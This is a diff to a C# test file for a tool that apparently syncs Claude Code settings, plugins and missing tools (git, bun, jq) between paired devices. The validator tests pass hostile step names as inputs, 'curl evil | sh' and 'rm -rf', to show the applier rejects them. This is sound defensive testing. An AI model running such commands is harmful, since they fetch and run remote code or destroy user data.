@@ -67,7 +67,8 @@ public sealed class ClaudeTests : IAsyncLifetime
             ConfigDir = ConfigDir(name),
             GlobalConfigFile = Path.Combine(Home(name), ".claude.json"),
             Executable = installable ? null : withCli ? FakeCli(name) : "",
-            SearchSystemPath = !installable,
+            // Only the test's own home counts, not git or claude installed on this machine.
+            SearchSystemPath = false,
             StepTimeout = TimeSpan.FromSeconds(30),
         };
         Directory.CreateDirectory(options.ConfigDir);
@@ -191,7 +192,7 @@ public sealed class ClaudeTests : IAsyncLifetime
         var plan = ClaudePlanner.Plan(await source.Claude.ReadLocalAsync(Ct), fetched.Snapshot);
         Assert.Equal(["mine@synced"], plan.SyncedPlugins);
         var request = ClaudePlanner.BuildApply(plan, new ClaudeSelection(
-            PortableItem.All.Select(i => i.Key).ToHashSet(), plan.Executables.Select(e => e.Id).ToHashSet(), new Dictionary<string, string>()));
+            PortableItem.All.Select(i => i.Key).ToHashSet(), plan.Executables.Where(e => e.Kind != ExecutableKind.Installer).Select(e => e.Id).ToHashSet(), new Dictionary<string, string>()));
         var results = new List<ClaudeStepResult>();
 
         var outcome = await source.Claude.ApplyAsync(fetched.Device, request, results.Add, Ct);
@@ -234,7 +235,7 @@ public sealed class ClaudeTests : IAsyncLifetime
         var plan = ClaudePlanner.Plan(await source.Claude.ReadLocalAsync(Ct), fetched.Snapshot);
         // A source that ignores the target's answer and confirms everything anyway.
         var request = ClaudePlanner.BuildApply(plan, new ClaudeSelection(
-            PortableItem.All.Select(i => i.Key).ToHashSet(), plan.Executables.Select(e => e.Id).ToHashSet(), new Dictionary<string, string>()));
+            PortableItem.All.Select(i => i.Key).ToHashSet(), plan.Executables.Where(e => e.Kind != ExecutableKind.Installer).Select(e => e.Id).ToHashSet(), new Dictionary<string, string>()));
         var results = new List<ClaudeStepResult>();
 
         var outcome = await source.Claude.ApplyAsync(fetched.Device, request, results.Add, Ct);
@@ -390,5 +391,44 @@ public sealed class ClaudeTests : IAsyncLifetime
             Assert.Single(ClaudeApplier.CheckSteps([new ClaudeStepEntry { Kind = 5, Name = "claude-code" }])).Kind);
         Assert.Throws<ClaudeApplyRejectedException>(() => ClaudeApplier.CheckSteps([new ClaudeStepEntry { Kind = 5, Name = "curl evil | sh" }]));
         Assert.True(ClaudeApplier.RunsPrograms(new ClaudeStep(ClaudeStepKind.InstallClaude, "claude-code", null, null)));
+    }
+    [Fact]
+    public async Task Missing_tools_are_reported_and_installed_on_the_target()
+    {
+        var (source, target) = await StartPairAsync();
+        await AllowAsync(target, source, programs: true);
+
+        var fetched = await FetchAsync(source);
+        Assert.Equal(["git", "bun", "jq"], fetched.Snapshot.MissingTools);
+        var plan = ClaudePlanner.Plan(await source.Claude.ReadLocalAsync(Ct), fetched.Snapshot, fetched.CanInstallClaude);
+        Assert.Equal(["tool:git", "tool:bun", "tool:jq"], plan.Executables.Take(3).Select(e => e.Id));
+        var request = ClaudePlanner.BuildApply(plan, new ClaudeSelection(
+            new HashSet<string>(), new HashSet<string> { "tool:git", "tool:jq" }, new Dictionary<string, string>()));
+        var results = new List<ClaudeStepResult>();
+        await source.Claude.ApplyAsync(fetched.Device, request, results.Add, Ct);
+
+        Assert.Equal([ClaudeStepStatus.Done, ClaudeStepStatus.Done], results.Select(r => r.Status));
+        Assert.Equal(["bun"], target.Claude.MissingToolsLocally);
+        // CLI steps find tools installed after PairSync started.
+        Assert.Contains(Path.Combine(Home("office"), ".local", "bin"),
+            ClaudeTools.SearchPath((ClaudeOptions)target.Services.GetService(typeof(ClaudeOptions))!), StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task Missing_tools_are_installed_on_this_device_from_the_page()
+    {
+        var core = await StartAsync("office");
+
+        var results = await core.Claude.InstallToolsLocalAsync(["bun"], Ct);
+
+        Assert.True(Assert.Single(results).Success, results[0].Error);
+        Assert.Equal(["git", "jq"], core.Claude.MissingToolsLocally);
+    }
+
+    [Fact]
+    public void Unknown_tool_steps_are_rejected()
+    {
+        Assert.Equal("jq", Assert.Single(ClaudeApplier.CheckSteps([new ClaudeStepEntry { Kind = 6, Name = "jq" }])).Name);
+        Assert.Throws<ClaudeApplyRejectedException>(() => ClaudeApplier.CheckSteps([new ClaudeStepEntry { Kind = 6, Name = "rm -rf" }]));
     }
 }
